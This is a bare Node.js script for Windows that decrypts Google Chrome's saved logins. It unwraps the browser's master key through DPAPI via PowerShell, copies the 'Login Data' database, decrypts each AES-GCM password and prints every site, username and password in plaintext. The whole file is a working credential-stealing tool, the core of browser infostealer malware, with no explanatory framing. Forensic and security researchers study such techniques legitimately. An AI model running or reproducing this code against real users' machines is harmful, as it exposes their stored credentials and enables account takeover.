const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execFileSync } = require("child_process");
const Database = require("better-sqlite3");


const chromeDir = path.join(
    process.env.LOCALAPPDATA,
    "Google",
    "Chrome",
    "User Data"
);

const localState = path.join(
    chromeDir,
    "Local State"
);

const loginDB = path.join(
    chromeDir,
    "Default",
    "Login Data"
);


// Windows DPAPI decrypt using PowerShell
function dpapiDecrypt(buffer) {

    const b64 = buffer.toString("base64");

    const ps = `
Add-Type -AssemblyName System.Security;
$bytes=[Convert]::FromBase64String("${b64}");
$result=[System.Security.Cryptography.ProtectedData]::Unprotect(
    $bytes,
    $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
);
[Convert]::ToBase64String($result)
`;

    const output = execFileSync(
        "powershell",
        [
            "-NoProfile",
            "-Command",
            ps
        ],
        {
            encoding:"utf8"
        }
    ).trim();

    return Buffer.from(output,"base64");
}


// Get AES key
function getMasterKey(){

    const state = JSON.parse(
        fs.readFileSync(localState,"utf8")
    );

    let key = Buffer.from(
        state.os_crypt.encrypted_key,
        "base64"
    );

    // remove DPAPI
    key = key.slice(5);

    return dpapiDecrypt(key);
}



// Chrome AES-GCM decrypt
function decryptPassword(data,key){

    if(
        data.slice(0,3).toString()=="v10" ||
        data.slice(0,3).toString()=="v11"
    ){

        const iv = data.slice(3,15);
        const tag = data.slice(data.length-16);
        const ciphertext =
            data.slice(15,data.length-16);


        const decipher =
            crypto.createDecipheriv(
                "aes-256-gcm",
                key,
                iv
            );

        decipher.setAuthTag(tag);

        return Buffer.concat([
            decipher.update(ciphertext),
            decipher.final()
        ]).toString();

    }

    return dpapiDecrypt(data).toString();
}



function main(){

    const key=getMasterKey();

    const temp="LoginData.tmp";

    fs.copyFileSync(
        loginDB,
        temp
    );


    const db=new Database(temp);


    const rows=db.prepare(`
        SELECT origin_url,
               username_value,
               password_value
        FROM logins
    `).all();


    for(const r of rows){

        console.log("--------------------------------");
        console.log("URL :",r.origin_url);
        console.log("USER:",r.username_value);

        try{
            console.log(
                "PASS:",
                decryptPassword(
                    r.password_value,
                    key
                )
            );
        }
        catch(e){
            console.log(
                "ERROR:",
                e.message
            );
        }
    }


    db.close();
    fs.unlinkSync(temp);

}


main();
